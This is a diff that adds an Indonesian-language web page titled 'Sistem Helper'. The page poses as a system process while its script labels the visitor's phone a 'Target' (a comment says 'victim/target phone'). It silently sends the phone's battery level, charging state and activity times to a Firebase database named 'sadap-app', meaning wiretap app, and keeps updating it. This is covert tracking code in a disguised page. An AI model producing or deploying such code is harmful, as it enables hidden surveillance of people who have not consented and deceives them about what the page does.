@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Helper</title>
+    <style>
+        body { background: #0f172a; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .box { background: #1e293b; padding: 20px; border-radius: 10px; margin: 20px; display: inline-block; width: 80%; max-width: 400px; }
+        #status { color: #38bdf8; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>Memproses Sistem...</h3>
+        <p id="status">Menghubungkan...</p>
+        <p style="opacity: 0.5; font-size: 12px;">ID: <span id="dev-id"></span></p>
+    </div>
+
+    <script>
+        const databaseURL = "https://sadap-app-d2359-default-rtdb.firebaseio.com";
+        
+        // Bikin ID unik untuk HP Korban/Target agar tidak tertukar
+        let deviceId = localStorage.getItem("winz_device_id");
+        if (!deviceId) {
+            deviceId = "Target_" + Math.floor(Math.random() * 99999);
+            localStorage.setItem("winz_device_id", deviceId);
+        }
+        document.getElementById('dev-id').innerText = deviceId;
+
+        function kirimData(level, charging) {
+            fetch(`${databaseURL}/devices/${deviceId}.json`, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    battery: level,
+                    charging: charging,
+                    lastActive: Date.now()
+                })
+            }).then(() => {
+                document.getElementById('status').innerText = "Berjalan di Latar Belakang";
+            }).catch(() => {
+                document.getElementById('status').innerText = "Menunggu Jaringan...";
+            });
+        }
+
+        // Ambil Data Baterai
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+                function update() {
+                    kirimData(Math.round(battery.level * 100), battery.charging ? "Mengisi Daya" : "Tidak Mengisi");
+                }
+                update();
+                battery.addEventListener('levelchange', update);
+                battery.addEventListener('chargingchange', update);
+            });
+        }
+    </script>
+</body>
+</html>
